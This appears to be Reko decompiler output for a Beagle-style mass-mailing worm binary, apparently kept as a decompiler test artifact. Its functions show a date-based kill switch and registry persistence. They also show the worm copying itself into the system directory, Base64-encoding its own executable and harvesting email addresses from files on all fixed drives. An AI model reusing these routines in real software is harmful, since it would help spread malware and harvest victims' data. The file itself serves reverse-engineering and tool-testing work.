// subject_beagle.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Stack (ptr32 Eq_2) dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn00401669
void fn00401000(union Eq_2 * dwArg04, uint32 dwArg08)
{
	union Eq_2 * edi_12 = dwArg04;
	uint32 ecx_14 = dwArg08 >> 0x02;
	if (dwArg08 >> 0x02 != 0x00)
	{
		for (; ecx_14 != 0x00; --ecx_14)
		{
			edi_12->u1.dw0000 = 0x00;
			edi_12 = (union Eq_2 *) &edi_12->u0.wDayOfWeek;
		}
	}
	ui32 ecx_25 = dwArg08 & 0x03;
	if ((dwArg08 & 0x03) != 0x00)
	{
		for (; ecx_25 != 0x00; --ecx_25)
		{
			*edi_12 = (union Eq_2 *) 0x00;
			edi_12 = (union Eq_2 *) ((char *) edi_12 + 1);
		}
	}
}

// 004010DD: void fn004010DD(Register Eq_37 edx, Stack Eq_37 dwArg04, Stack Eq_37 dwArg08, Stack Eq_40 dwArg0C)
// Called from:
//      fn004016CA
void fn004010DD(Eq_37 edx, Eq_37 dwArg04, Eq_37 dwArg08, Eq_40 dwArg0C)
{
	word32 dwLoc08_174 = 0x00;
	Eq_37 esi_151 = dwArg04;
	Eq_37 edi_112 = dwArg08;
	Eq_40 ecx_119 = dwArg0C;
	word24 eax_24_8_152 = 0x00;
	do
	{
		uint32 eax_230;
		byte al_29 = esi_151.u0->t0000.u1;
		ui32 ebx_126 = 0x00;
		&esi_151.u0->t0000.u0 = &esi_151.u1->b0001;
		Eq_55 eax_32 = SEQ(eax_24_8_152, al_29);
		Eq_40 ecx_36 = ecx_119 - 0x01;
		if (ecx_36 == 0x00)
		{
			ebx_126 = 0x02;
			eax_230 = SEQ(SLICE(eax_32 << 0x10, word24, 8), al_29 << 0x10);
		}
		else
		{
			byte al_37 = esi_151.u0->t0000.u1;
			&esi_151.u0->t0000.u0 = &esi_151.u1->b0001;
			Eq_54 eax_40 = SEQ(eax_32, al_37);
			--ecx_36;
			if (ecx_36 == 0x01)
			{
				ebx_126 = 0x01;
				eax_230 = SEQ(eax_40, al_37 << 0x08);
			}
			else
			{
				&esi_151.u0->t0000.u0 = (word32) esi_151 + 2;
				ecx_36 -= 0x02;
				eax_230 = SEQ(eax_40, esi_151.u1->b0001);
			}
		}
		word32 ecx_62;
		uint32 eax_227 = eax_230;
		for (ecx_62 = 0x04; ecx_62 != 0x00; --ecx_62)
		{
			byte al_69 = (byte) eax_234;
			edx_160 = SEQ(edx_24_8_82, al_69 & 0x3F);
			word24 edx_24_8_82 = SLICE(__rol<word32,byte>(edx, 0x08), word24, 8);
			eax_227 = eax_234 >> 0x06;
			edx = edx_160;
			eax_234 = eax_227;
		}
		Eq_37 edx_84 = fn00401159(0x04, al_69 & 0x3F, edx_24_8_82);
		edi_112.u0->t0000.u0 = (word32) edx_84;
		word32 v21_103 = dwLoc08_174 + 0x01;
		&edi_112.u0->t0000.u0 = edi_112.u0 + 4;
		edx = edx_84;
		eax_24_8_152 = SLICE(eax_234 >> 0x06, word24, 8);
		dwLoc08_174 = v21_103;
		if (v21_103 == 0x12)
		{
			edi_112.u0->t0000 = 0x0A0D;
			dwLoc08_174 = 0x00;
			&edi_112.u0->t0000.u0 = edi_112.u0 + 2;
			eax_24_8_152 = SLICE(eax_234 >> 0x06, word24, 8);
		}
		ecx_119 = ecx_36;
	} while (ecx_36 != 0x00);
	ui32 ecx_127;
	byte * edi_129 = edi_112 - ebx_126;
	for (ecx_127 = ebx_126; ecx_127 != 0x00; --ecx_127)
	{
		*edi_129 = 0x3D;
		++edi_129;
	}
}

// 00401159: Register word32 fn00401159(Register word32 ecx, Register cu8 dl, Register word24 edx_24_8)
// Called from:
//      fn004010DD
word32 fn00401159(word32 ecx, cu8 dl, word24 edx_24_8)
{
	do
	{
		Eq_37 edx_20;
		if (dl < 0x3E)
		{
			if (dl <= 0x33)
			{
				cu8 dl_15 = dl + 0x41;
				edx_20 = SEQ(edx_24_8, dl_15);
				if (dl_15 > 0x5A)
					edx_20 = SEQ(edx_24_8, dl_15 + 0x06);
			}
			else
				edx_20 = SEQ(edx_24_8, dl + 252);
		}
		else
			edx_20 = SEQ(edx_24_8, (dl - 0x3E << 0x02) + 0x2B);
		word32 edx_28 = __rol<word32,byte>(edx_20, 0x08);
		dl = (byte) edx_28;
		edx_24_8 = SLICE(edx_28, word24, 8);
		--ecx;
	} while (ecx != 0x00);
	return edx_28;
}

// 0040126F: void fn0040126F(Stack Eq_40 dwArg04)
// Called from:
//      fn004012AA
//      fn00401835
void fn0040126F(Eq_40 dwArg04)
{
	g_t405814.u0 = (DWORD) dwArg04;
	g_dw4056C5 = 0x01;
	word32 * edi_11 = &g_t405814;
	Eq_40 eax_12 = dwArg04;
	do
	{
		++edi_11;
		eax_12 = g_dw4056C9 * eax_12;
		*edi_11 = (word32) eax_12;
		++g_dw4056C5;
	} while (g_dw4056C5 != 0x0270);
}

// 004012AA: Register uint32 fn004012AA(Stack uint32 dwArg04)
// Called from:
//      fn004015A5
//      Win32CrtStartup
uint32 fn004012AA(uint32 dwArg04)
{
	if (g_dw4056C5 >= 0x0270)
	{
		if (g_dw4056C5 == 0x0271)
			fn0040126F(0x1105);
		word32 dwLoc08_178 = 0x00;
		struct Eq_265 * esi_35 = &g_t405814;
		do
		{
			uint32 eax_42 = esi_35->dw0000 & 0x80000000 | esi_35[1] & 0x7FFFFFFF;
			ui32 eax_48 = eax_42 >> 0x01 ^ esi_35[397];
			if ((eax_42 & 0x01) != 0x00)
				eax_48 = eax_48 ^ 0x9908B0DF;
			esi_35->dw0000 = eax_48;
			word32 v20_65 = dwLoc08_178 + 0x01;
			++esi_35;
			dwLoc08_178 = v20_65;
		} while (v20_65 != 227);
		do
		{
			uint32 eax_75 = esi_35->dw0000 & 0x80000000 | esi_35[1] & 0x7FFFFFFF;
			ui32 eax_81 = eax_75 >> 0x01 ^ esi_35->dwFFFFFC74;
			if ((eax_75 & 0x01) != 0x00)
				eax_81 = eax_81 ^ 0x9908B0DF;
			esi_35->dw0000 = eax_81;
			word32 v21_98 = dwLoc08_178 + 0x01;
			++esi_35;
			dwLoc08_178 = v21_98;
		} while (v21_98 != 0x026F);
		ui32 eax_109 = eax_81 ^ g_dw405E44;
		if ((eax_75 & 0x01 & 0x01) != 0x00)
			eax_109 = eax_109 ^ 0x9908B0DF;
		esi_35->dw0000 = eax_109;
		g_dw4056C5 = 0x00;
	}
	uint32 eax_129 = g_dw4056C5;
	++g_dw4056C5;
	uint32 eax_134 = (&g_t405814.u0)[eax_129 * 0x04];
	ui32 ebx_137 = eax_134 ^ eax_134 >> 11;
	ui32 ebx_141 = ebx_137 ^ ebx_137 << 0x07 & 2636928640;
	uint32 ebx_145 = ebx_141 ^ ebx_141 << 0x0F & 0xEFC60000;
	return (uint32) ((uint64) (ebx_145 >> 0x12 ^ ebx_145) % dwArg04);
}

// 00401524: void fn00401524(Stack (ptr32 Eq_37) dwArg04, Stack ui32 dwArg08)
// Called from:
//      fn00402ADD
void fn00401524(union Eq_37 * dwArg04, ui32 dwArg08)
{
	dwArg04->u0 = (struct Eq_1830 *) GlobalAlloc(0x40, dwArg08 << 0x02);
}

// 004015A5: void fn004015A5()
// Called from:
//      fn00401835
void fn004015A5()
{
	Eq_40 tLoc10;
	Eq_40 tLoc0C;
	Eq_372 tLoc08;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, &tLoc08);
	tLoc10.u1 = 0x09;
	if (RegQueryValueExA(tLoc08, 0x00405702, null, &tLoc0C, g_a4056CD, &tLoc10) != 0x00)
	{
		byte * edi_46 = g_a4056CD;
		word32 esi_47;
		for (esi_47 = 0x09; esi_47 != 0x00; --esi_47)
		{
			*edi_46 = (byte) fn004012AA(0x09) + 0x31;
			++edi_46;
		}
		RegSetValueExA(tLoc08, 0x00405702, 0x00, 0x01, g_a4056CD, 0x08);
	}
	RegCloseKey(tLoc08);
}

// 00401625: void fn00401625()
// Called from:
//      fn00401835
void fn00401625()
{
	Eq_372 tLoc08;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x00405706, &tLoc08);
	RegSetValueExA(tLoc08, 0x00405734, 0x00, 0x01, &g_t407F20, lstrlenA(4226848));
	RegCloseKey(tLoc08);
}

// 00401669: Register word32 fn00401669()
// Called from:
//      fn00401835
word32 fn00401669()
{
	Eq_494 tLoc34;
	Eq_495 tLoc2C;
	Eq_496 tLoc24;
	Eq_497 tLoc14;
	word32 eax_58;
	GetLocalTime(&tLoc14);
	fn00401000(&tLoc24, 0x10);
	tLoc24.wYear = (WORD) 2004;
	tLoc24.wMonth = (WORD) 0x01;
	tLoc24.wDay = (WORD) 0x1C;
	SystemTimeToFileTime(&tLoc14, &tLoc2C);
	SystemTimeToFileTime(&tLoc24, &tLoc34);
	if (CompareFileTime(&tLoc2C, &tLoc34) == 0x01)
		eax_58 = 0x00;
	else
		eax_58 = 0x01;
	return eax_58;
}

// 004016CA: void fn004016CA()
// Called from:
//      fn00401835
void fn004016CA()
{
	Eq_37 eax_14 = GlobalAlloc(0x40, 0x2000);
	GetModuleFileNameA(null, eax_14, 0x1FFF);
	Eq_40 eax_41 = CreateFileA(eax_14, 0x80000000, 0x01, null, 0x03, 0x00, 0x00);
	if (eax_41 != ~0x00)
	{
		Eq_40 eax_52 = GetFileSize(eax_41, null);
		if (eax_52 != ~0x00)
		{
			Eq_40 eax_71 = CreateFileMappingA(eax_41, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_71 != 0x00)
			{
				Eq_37 eax_89 = MapViewOfFile(eax_71, 0x04, 0x00, 0x00, 0x00);
				if (eax_89 != 0x00)
				{
					g_t407F14.u0 = (struct Eq_1830 *) GlobalAlloc(0x40, eax_52 << 0x02);
					fn004010DD(eax_89, eax_89, g_t407F14.u0, eax_52);
					g_dw407F18 = lstrlenA(g_t407F14.u0);
					UnmapViewOfFile(eax_89);
				}
				CloseHandle(eax_71);
			}
		}
		CloseHandle(eax_41);
	}
	GlobalFree(eax_14);
}

// 0040179B: void fn0040179B()
// Called from:
//      fn00401835
void fn0040179B()
{
	Eq_662 tLoc0C;
	Eq_372 tLoc08;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, &tLoc08);
	tLoc0C = (Eq_662) 0x01;
	RegSetValueExA(tLoc08, 0x0040574F, 0x00, 0x04, &tLoc0C, 0x04);
	RegCloseKey(tLoc08);
}

// 004017DC: Register word32 fn004017DC()
// Called from:
//      fn00401835
word32 fn004017DC()
{
	Eq_662 tLoc14;
	Eq_40 tLoc10;
	Eq_40 tLoc0C;
	Eq_372 tLoc08;
	word32 ebx_45;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, &tLoc08);
	tLoc10.u1 = 0x04;
	if (RegQueryValueExA(tLoc08, 0x0040574F, null, &tLoc0C, &tLoc14, &tLoc10) != 0x00)
		ebx_45 = 0x01;
	else
		ebx_45 = 0x00;
	RegCloseKey(tLoc08);
	return ebx_45;
}

// 00401835: void fn00401835(Register word32 ebp)
// Called from:
//      Win32CrtStartup
void fn00401835(word32 ebp)
{
	Eq_755 tLoc0192;
	tLoc0192.dw018E = ebp;
	if (fn00401669() != 0x00)
	{
		fn0040126F(GetTickCount());
		fn004015A5();
		WSAStartup(0x0101, &tLoc0192);
		fn00402ADD();
		g_t407F1C.u0 = (DWORD) CreateMutexA(null, 0x00, 0x00);
		fn00402737();
		fn004016CA();
		GetSystemDirectoryA(4226848, 0x0104);
		GetModuleFileNameA(null, 0x00408025, 0x0104);
		lstrcatA(4226848, 4216642);
		fn00401625();
		if (shlwapi.dll!StrStrIA(0x00408025, 4226848) != 0x00)
		{
			if (fn004017DC() != 0x00)
				g_dw405754 = 0x01;
			fn0040179B();
		}
		else
		{
			Eq_37 eax_136 = GetCommandLineA();
			do
			{
				if (eax_136.u0->t0000.u0 == 0x6470752D)
					goto l004018F5;
				&eax_136.u0->t0000.u0 = &eax_136.u1->b0001;
			} while (eax_136.u0[3] != 0x00);
			esp_104->tFFFFFFFC.u0 = 0x05;
			esp_104->tFFFFFFF8.u0 = 4216545;
			WinExec(esp_104->tFFFFFFF8, esp_104->tFFFFFFFC.u1);
l004018F5:
			esp_104->tFFFFFFFC.u0 = 0x00;
			esp_104->tFFFFFFF8.u0 = 4226848;
			esp_104->tFFFFFFF4.u0 = 0x00408025;
			if (CopyFileA(esp_104->tFFFFFFF4, esp_104->tFFFFFFF8, esp_104->tFFFFFFFC.u0) != 0x00)
			{
				esp_104->tFFFFFFFC.u0 = 0x00;
				esp_104->tFFFFFFF8.u0 = 4226848;
				WinExec(esp_104->tFFFFFFF8, esp_104->tFFFFFFFC.u1);
			}
			esp_104->tFFFFFFFC.u0 = 0x00;
			ExitProcess(esp_104->tFFFFFFFC.u1);
		}
	}
	else
		ExitProcess(0x00);
}

DWORD g_t401BA7(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00401BA7
// 00401C78: void fn00401C78(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
// Called from:
//      Win32CrtStartup
void fn00401C78(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	Eq_40 tLoc0C;
	Eq_37 eax_14 = GlobalAlloc(0x00, 0x0C);
	eax_14.u0->t0000.u0 = dwArg04;
	eax_14.u0[4] = (struct Eq_1830) dwArg08;
	eax_14.u0[8] = (struct Eq_1830) dwArg0C;
	CloseHandle(CreateThread(null, 0x00, &g_t401BA7, eax_14, 0x00, &tLoc0C));
}

// 00402737: void fn00402737()
// Called from:
//      fn00401835
void fn00402737()
{
	g_t408146.u0 = (DWORD) CreateMutexA(null, 0x00, 0x00);
	g_dw40812A = 0x00;
	g_dw40812E = 0x00;
	word32 ebx_21;
	word32 * edi_22 = g_a408132;
	for (ebx_21 = 0x05; ebx_21 != 0x00; --ebx_21)
	{
		*edi_22 = (word32) GlobalAlloc(0x40, 0x0C);
		++edi_22;
	}
}

// 004028A5: Register Eq_37 fn004028A5(Register Eq_37 esi, Stack Eq_37 dwArg04)
// Called from:
//      fn00402985
Eq_37 fn004028A5(Eq_37 esi, Eq_37 dwArg04)
{
	Eq_37 ebx_14 = esi;
	Eq_37 esi_16 = esi - 0x02;
	cu8 cl_18 = 0x01;
	while (esi_16 >= dwArg04)
	{
		cu8 al_25 = esi_16.u0->t0000.u1;
		--esi_16;
		if ((al_25 < 0x30 || al_25 > 0x39) && ((al_25 < 0x41 || al_25 > 0x5A) && ((al_25 < 0x61 || al_25 > 122) && (al_25 != 0x2E && (al_25 != 0x5F && (al_25 != 0x2D && (al_25 != 0x00 || cl_18 == 0x00)))))))
			return ebx_14;
		&ebx_14.u0->t0000.u0 = &esi_16.u1->b0001;
		cl_18 = al_25;
	}
	return ebx_14;
}

// 004028F3: Register Eq_37 fn004028F3(Register Eq_37 esi, Stack Eq_37 dwArg04)
// Called from:
//      fn00402985
Eq_37 fn004028F3(Eq_37 esi, Eq_37 dwArg04)
{
	Eq_37 ebx_14 = esi;
	cu8 cl_16 = 0x01;
	while (esi < dwArg04)
	{
		cu8 al_22 = esi.u0->t0000.u1;
		&esi.u0->t0000.u0 = &esi.u1->b0001;
		if ((al_22 < 0x30 || al_22 > 0x39) && ((al_22 < 0x41 || al_22 > 0x5A) && ((al_22 < 0x61 || al_22 > 122) && (al_22 != 0x2E && (al_22 != 0x5F && (al_22 != 0x2D && (al_22 != 0x00 || cl_16 == 0x00)))))))
			return ebx_14;
		ebx_14 = esi;
		cl_16 = al_22;
	}
	return ebx_14;
}

// 0040293D: Register word32 fn0040293D(Stack Eq_37 dwArg04, Stack Eq_37 dwArg08)
// Called from:
//      fn00402985
word32 fn0040293D(Eq_37 dwArg04, Eq_37 dwArg08)
{
	if (dwArg08 - dwArg04 < 0x02)
		return 0x00;
	return 0x01;
}

// 0040295A: Register Eq_37 fn0040295A(Stack Eq_37 dwArg04)
// Called from:
//      fn00402985
Eq_37 fn0040295A(Eq_37 dwArg04)
{
	Eq_37 eax_16 = shlwapi.dll!StrRChrA(dwArg04, 0x00, 0x2E);
	Eq_37 eax_19 = eax_16;
	if (eax_16 != 0x00)
	{
		esp_15->tFFFFFFFC.u0 = (struct Eq_1830 *) eax_16;
		if (lstrlenA(esp_15->tFFFFFFFC) <= 0x02)
			&eax_19.u0->t0000.u0 = 0x00;
		else
			&eax_19.u0->t0000.u0 = 0x01;
	}
	return eax_19;
}

// 00402985: Register word32 fn00402985(Stack Eq_37 dwArg04, Stack Eq_40 dwArg08, Stack (ptr32 code) dwArg0C)
// Called from:
//      fn00402A5A
word32 fn00402985(Eq_37 dwArg04, Eq_40 dwArg08, <anonymous> * dwArg0C)
{
	ptr32 fp;
	Eq_1134 tLoc0204;
	word32 dwLoc10_202 = 0x00;
	Eq_37 esi_187 = dwArg04;
	word32 * esp_188 = fp + ~0x020F;
	word32 v10_26 = dwArg08 + dwArg04;
	while (esi_187 < v10_26)
	{
		word32 v12_43 = dwLoc10_202 + 0x01;
		dwLoc10_202 = v12_43;
		if (v12_43 == 10000)
		{
			union Eq_40 * esp_47 = esp_188 - 4;
			esp_47->u0 = 0x01;
			Sleep(esp_47->u0);
			dwLoc10_202 = 0x00;
		}
		&esi_187.u0->t0000.u0 = &esi_187.u1->b0001;
		if (esi_187.u0->t0000.u1 == 0x40)
		{
			struct Eq_1173 * esp_59 = esp_188 - 4;
			esp_59->dw0000 = (word32) esi_187;
			esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) dwArg04;
			byte * eax_66 = fn004028A5(esi_187, esp_59->tFFFFFFFC.u0);
			esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) v10_26;
			struct Eq_1173 * esp_140 = esp_59;
			up32 ecx_114 = fn004028F3(esi_187, esp_59->tFFFFFFFC.u0) - eax_66;
			if (ecx_114 < 500 && ecx_114 > 0x05)
			{
				byte * esi_101 = eax_66;
				Eq_37 edi_107 = &tLoc0204;
				Eq_37 edx_112 = 0x00;
				do
				{
					byte al_100 = *esi_101;
					++esi_101;
					if (al_100 != 0x00)
					{
						edi_107.u0->t0000.u1 = al_100;
						&edi_107.u0->t0000.u0 = &edi_107.u1->b0001;
						if (al_100 == 0x40)
							edx_112 = edi_107;
					}
					--ecx_114;
				} while (ecx_114 != 0x00);
				edi_107.u0->t0000.u1 = (CHAR) 0x00;
				Eq_37 edi_120 = &edi_107.u1->b0001;
				if (edx_112 != 0x00)
				{
					esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) edx_112;
					esp_59->tFFFFFFF8.u0 = (struct Eq_1830 *) &tLoc0204;
					Eq_1251 eax_137 = lstrlenA(esp_59->tFFFFFFF8);
					Eq_37 edx_139 = esp_59->tFFFFFFFC.u0;
					esp_140 = esp_59;
					if (eax_137 > 0x05)
					{
						esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) edx_139;
						esp_59->tFFFFFFF8.u0 = (struct Eq_1830 *) &tLoc0204;
						ui32 eax_148 = fn0040293D(esp_59->tFFFFFFF8.u0, esp_59->tFFFFFFFC.u0);
						esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) edi_120;
						esp_59->tFFFFFFF8.u0 = (struct Eq_1830 *) edx_139;
						esp_140 = esp_59;
						if ((eax_148 & fn0040295A((esp_59->tFFFFFFF8).u0)) != 0x00)
						{
							esp_59->tFFFFFFFC.u0 = (struct Eq_1830 *) &tLoc0204;
							word32 ecx_181;
							word32 edx_182;
							dwArg0C();
						}
					}
				}
			}
			&esi_187.u0->t0000.u0 = esp_140->dw0000;
			esp_188 = (word32 *) (esp_140 + 1);
		}
	}
	return *esp_188;
}

// 00402A5A: void fn00402A5A(Stack Eq_37 dwArg04, Stack (ptr32 code) dwArg08)
// Called from:
//      fn00402B8F
void fn00402A5A(Eq_37 dwArg04, <anonymous> * dwArg08)
{
	Eq_40 eax_28 = CreateFileA(dwArg04, 0x80000000, 0x01, null, 0x03, 0x00, 0x00);
	if (eax_28 != ~0x00)
	{
		Eq_40 eax_39 = GetFileSize(eax_28, null);
		if (eax_39 != ~0x00)
		{
			Eq_40 eax_58 = CreateFileMappingA(eax_28, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_58 != 0x00)
			{
				Eq_40 ebx_108 = eax_58;
				Eq_37 eax_76 = MapViewOfFile(eax_58, 0x04, 0x00, 0x00, 0x00);
				if (eax_76 != 0x00)
				{
					ebx_108 = fn00402985(eax_76, eax_39, dwArg08);
					UnmapViewOfFile(eax_76);
				}
				CloseHandle(ebx_108);
			}
		}
		CloseHandle(eax_28);
	}
}

// 00402ADD: void fn00402ADD()
// Called from:
//      fn00401835
void fn00402ADD()
{
	fn00401524(&g_t40814A, 5000);
	g_b40814E = 0x00;
}

<anonymous> g_t402B2C = <code>; // 00402B2C
// 00402B8F: Register word32 fn00402B8F(Stack Eq_37 dwArg04)
// Called from:
//      fn00402BCB
word32 fn00402B8F(Eq_37 dwArg04)
{
	char * edi_11 = &g_b40501C;
	do
	{
		Eq_1418 size_18 = strlen(edi_11) + 1;
		edi_11 += size_18;
		if (shlwapi.dll!StrStrIA(~0x00, ~0x00 - size_18, edi_11, dwArg04, edi_11) != 0x00)
		{
			esp_30->ptrFFFFFFFC = &g_t402B2C;
			esp_30->tFFFFFFF8.u0 = (struct Eq_1830 *) dwArg04;
			fn00402A5A(esp_30->tFFFFFFF8.u0, esp_30->ptrFFFFFFFC);
			return esp_30->dw0000;
		}
	} while (*edi_11 != 0x00);
	return esp_30->dw0000;
}

// 00402BCB: void fn00402BCB(Stack Eq_37 dwArg04, Stack Eq_37 dwArg08)
// Called from:
//      fn00402BCB
//      fn00402C9D
void fn00402BCB(Eq_37 dwArg04, Eq_37 dwArg08)
{
	ptr32 fp;
	Eq_40 eax_17 = LocalAlloc(0x00, 0x0400);
	Eq_40 eax_24 = LocalAlloc(0x00, 0x013E);
	int32 edi_150 = lstrlenA(dwArg04);
	lstrcatA(dwArg04, 0x004057E7);
	Eq_40 eax_46 = FindFirstFileA(dwArg04, eax_24);
	ptr32 esp_105 = fp + ~0x13;
	if (eax_46 != ~0x00)
	{
		do
		{
			dwArg04.u0[edi_150] = (struct Eq_1830) 0x00;
			if (Mem56[eax_24 + 44:word16] != 0x2E && Mem56[eax_24 + 44:word16] != 0x2E2E)
			{
				struct Eq_1548 * esp_64 = esp_105 - 4;
				Mem65[esp_64 + 0x00:word32] = eax_24 + 44;
				esp_64->tFFFFFFFC.u0 = (struct Eq_1830 *) dwArg04;
				lstrcatA(esp_64->tFFFFFFFC.u6, esp_64->t0000);
				if ((eax_24.u3->dwFileAttributes & 0x10) != 0x00)
				{
					esp_64->t0000.u0 = 0x004057E5;
					esp_64->tFFFFFFFC.u0 = (struct Eq_1830 *) dwArg04;
					lstrcatA(esp_64->tFFFFFFFC.u6, esp_64->t0000);
					esp_64->t0000.u0 = (struct Eq_1830 *) dwArg08;
					esp_64->tFFFFFFFC.u0 = (struct Eq_1830 *) dwArg04;
					// Failed to bind call argument.
					// Please report this issue at https://github.com/uxmal/reko
					// Failed to bind call argument.
					// Please report this issue at https://github.com/uxmal/reko
					Eq_37 stackArg4 = <invalid>;
					Eq_37 stackArg8 = (struct Eq_1830 *) <invalid>;
					fn00402BCB(stackArg4, stackArg8);
					esp_105 = esp_64 - 4;
				}
				else
				{
					esp_64->t0000.u0 = (struct Eq_1830 *) dwArg04;
					edi_150 = fn00402B8F(esp_64->t0000.u0);
					esp_105 = (char *) &esp_64->t0000 + 4;
				}
			}
			struct Eq_1509 * esp_112 = esp_105 - 4;
			esp_112->t0000.u0 = 0x01;
			Sleep(esp_112->t0000.u0);
			esp_112->t0000.u0 = (DWORD) eax_24;
			esp_112->tFFFFFFFC.u0 = (DWORD) eax_46;
			esp_105 = (char *) &esp_112->t0000 + 4;
		} while (FindNextFileA(esp_112->tFFFFFFFC.u0, esp_112->t0000.u0) != 0x00);
		esp_112->t0000.u0 = (DWORD) eax_46;
		FindClose(esp_112->t0000.u0);
		esp_105 = (char *) &esp_112->t0000 + 4;
	}
	union Eq_40 * esp_137 = esp_105 - 4;
	esp_137->u0 = (DWORD) eax_17;
	LocalFree(esp_137->u0);
	esp_137->u0 = (DWORD) eax_24;
	LocalFree(esp_137->u0);
}

// 00402C9D: void fn00402C9D(Stack Eq_37 dwArg04)
// Called from:
//      fn00402CCE
void fn00402C9D(Eq_37 dwArg04)
{
	Eq_37 eax_14 = GlobalAlloc(0x40, 0x00010000);
	Eq_37 eax_22 = lstrcpyA(eax_14, dwArg04);
	fn00402BCB(eax_22, eax_22);
	GlobalFree(eax_14);
}

// 00402CCE: void fn00402CCE()
// Called from:
//      Win32CrtStartup
void fn00402CCE()
{
	Eq_37 eax_20 = GlobalAlloc(0x40, 0x2000);
	GetLogicalDriveStringsA(0x1FFF, eax_20);
	Eq_37 esi_30 = eax_20;
	while (esi_30.u0->t0000.u1 != 0x00)
	{
		if (GetDriveTypeA(esi_30) == 0x03)
			fn00402C9D(esi_30);
		esi_30 = esi_30 + lstrlenA(esi_30) + 0x01;
	}
	GlobalFree(eax_20);
}

DWORD g_t402DED(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 00402DED
// 00402E07: void fn00402E07()
// Called from:
//      Win32CrtStartup
void fn00402E07()
{
	Eq_40 tLoc08;
	CloseHandle(CreateThread(null, 0x00, &g_t402DED, 0x00, 0x00, &tLoc08));
}

// 0040318A: Register Eq_40 Win32CrtStartup()
Eq_40 Win32CrtStartup()
{
	word32 ebp;
	CoInitialize(0x00);
	fn00401835(ebp);
	if (g_dw405003 == 0x00)
		g_dw405003 = fn004012AA(45000) + 5000;
	fn00401C78(g_dw405003, 0x004030F6, 4216668);
	fn00402E07();
	if (g_dw405754 != 0x00)
		fn00402CCE();
	while (true)
		Sleep(1000);
}

// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw405003 = 6777; // 00405003
char g_b40501C = '.'; // 0040501C
uint32 g_dw4056C5 = 0x0271; // 004056C5
uint32 g_dw4056C9 = 69069; // 004056C9
byte g_a4056CD[] = // 004056CD
	{
	};
word32 g_dw405754 = 0x00; // 00405754
Eq_40 g_t405814 = // 00405814
	{
		0x00
	};
Eq_40 g_a405818[] = // 00405818
	{
	};
word32 g_dw405E44 = 0x00; // 00405E44
Eq_37 g_t407F14 = // 00407F14
	{
		null
	};
int32 g_dw407F18 = 0; // 00407F18
Eq_40 g_t407F1C = // 00407F1C
	{
		0x00
	};
Eq_469 g_t407F20 = 0x00; // 00407F20
word32 g_dw40812A = 0x00; // 0040812A
word32 g_dw40812E = 0x00; // 0040812E
Eq_37 g_a408132[] = // 00408132
	{
	};
Eq_40 g_t408146 = // 00408146
	{
		0x00
	};
Eq_37 g_t40814A = // 0040814A
	{
		null
	};
byte g_b40814E = 0x00; // 0040814E
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__ShellExecuteA = &g_t47B8; // 00404000
<anonymous> * __imp__RegSetValueExA = &g_t4776; // 00404008
<anonymous> * __imp__RegQueryValueExA = &g_t4762; // 0040400C
<anonymous> * __imp__RegCreateKeyA = &g_t4752; // 00404010
<anonymous> * __imp__RegCloseKey = &g_t4744; // 00404014
<anonymous> * __imp__GetNetworkParams = &g_t4796; // 0040401C
<anonymous> * __imp__FindClose = &g_t43B6; // 00404024
<anonymous> * __imp__FindFirstFileA = &g_t43C2; // 00404028
<anonymous> * __imp__FindNextFileA = &g_t43D4; // 0040402C
<anonymous> * __imp__GetCommandLineA = &g_t43E4; // 00404030
<anonymous> * __imp__GetDateFormatA = &g_t43F6; // 00404034
<anonymous> * __imp__GetDriveTypeA = &g_t4408; // 00404038
<anonymous> * __imp__GetFileSize = &g_t4418; // 0040403C
<anonymous> * __imp__GetLocalTime = &g_t4426; // 00404040
<anonymous> * __imp__GetLogicalDriveStringsA = &g_t4436; // 00404044
<anonymous> * __imp__GetModuleFileNameA = &g_t4450; // 00404048
<anonymous> * __imp__GetSystemDirectoryA = &g_t4466; // 0040404C
<anonymous> * __imp__GetTickCount = &g_t447C; // 00404050
<anonymous> * __imp__GetTimeFormatA = &g_t448C; // 00404054
<anonymous> * __imp__GetTimeZoneInformation = &g_t449E; // 00404058
<anonymous> * __imp__GetWindowsDirectoryA = &g_t44B8; // 0040405C
<anonymous> * __imp__GlobalAlloc = &g_t44D0; // 00404060
<anonymous> * __imp__LocalAlloc = &g_t44EC; // 00404064
<anonymous> * __imp__LocalFree = &g_t44FA; // 00404068
<anonymous> * __imp__MapViewOfFile = &g_t4506; // 0040406C
<anonymous> * __imp__ReleaseMutex = &g_t4516; // 00404070
<anonymous> * __imp__Sleep = &g_t4526; // 00404074
<anonymous> * __imp__SystemTimeToFileTime = &g_t452E; // 00404078
<anonymous> * __imp__UnmapViewOfFile = &g_t4546; // 0040407C
<anonymous> * __imp__WaitForSingleObject = &g_t4558; // 00404080
<anonymous> * __imp__WinExec = &g_t456E; // 00404084
<anonymous> * __imp__WriteFile = &g_t4578; // 00404088
<anonymous> * __imp__lstrcatA = &g_t4584; // 0040408C
<anonymous> * __imp__lstrcmpiA = &g_t4590; // 00404090
<anonymous> * __imp__lstrcpyA = &g_t459C; // 00404094
<anonymous> * __imp__lstrlenA = &g_t45A8; // 00404098
<anonymous> * __imp__CreateMutexA = &g_t4388; // 0040409C
<anonymous> * __imp__CreateThread = &g_t4398; // 004040A0
<anonymous> * __imp__CloseHandle = &g_t4338; // 004040A4
<anonymous> * __imp__ExitProcess = &g_t43A8; // 004040A8
